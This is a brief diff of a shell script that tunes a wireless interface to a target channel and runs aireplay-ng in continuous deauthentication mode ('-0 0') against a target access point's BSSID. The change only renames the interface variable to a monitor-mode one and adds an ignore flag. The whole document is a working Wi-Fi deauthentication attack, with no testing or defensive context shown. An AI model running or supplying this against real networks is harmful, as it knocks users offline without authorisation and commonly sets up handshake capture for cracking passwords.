@@ -2,5 +2,5 @@
 
 source ./config.cfg
 
-iwconfig $IFACE channel $TARGET_CHANNEL
-aireplay-ng -0 0 -a $TARGET_BSSID $IFACE
+iwconfig $MONA channel $TARGET_CHANNEL
+aireplay-ng -0 0 -a $TARGET_BSSID $MONA --ignore-negative-one
